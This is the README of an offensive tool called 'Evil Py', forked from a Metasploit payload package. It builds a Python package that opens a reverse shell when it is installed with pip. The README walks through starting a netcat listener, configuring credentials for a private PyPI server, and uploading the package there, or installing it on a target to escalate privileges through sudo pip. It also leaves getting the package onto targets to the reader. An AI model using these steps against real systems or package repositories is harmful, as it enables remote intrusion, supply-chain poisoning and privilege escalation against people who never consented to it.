# Evil Py
This is a fork of a python package MSF Payload developed by sn0wfa11.

It has been modified to chin off the MSF payload and instead deploy a simple reverse shell. It deploys it a private pip respoitory, but the option remains for it to be sued locally for sudo pip privesc

It also drops some requirements to make it easier to wield.

Python users need to be aware that packages installed via `pip` have the ability to execute python code as part of the install process. This can be leveraged in situations where an attacker is able to execute pip commands remotely or for privilege escalation when a low priv user has sudo rights to `pip` or root's suid bit is set. 

Credit to the original author... https://github.com/sn0wfa11


Target a PyPi Server
====================
- Start a nc listener
```
 nc -lknp <port> &
```
- Install the package build process dependencies
```
python -m pip install --user --upgrade setuptools wheel
```
- Modify the provided .pypirc file with your private repo detai;s
```
[distutils]
index-servers = private-repository

[private-repository]
repository = http://<server>:<port>
username = <username>
password = <password>

```
- Deploy

```
python3 setup.py sdist upload -r private-repository
```

Target a local machine or a remote machine with PIP access
=====================
- Start a nc listener
```
 nc -lknp <port> &
```
- Install the package build process dependencies
```
python -m pip install --user --upgrade setuptools wheel
```
```
python setup.py sdist bdist_wheel
```
- Grab the .tar.gz file out of the /dist folder and place this on your target. 
  - There may be multiple ways to get the package to the target... but that's for you to research. ;)
- Run `pip install evil_py-<version>.tar.gz`
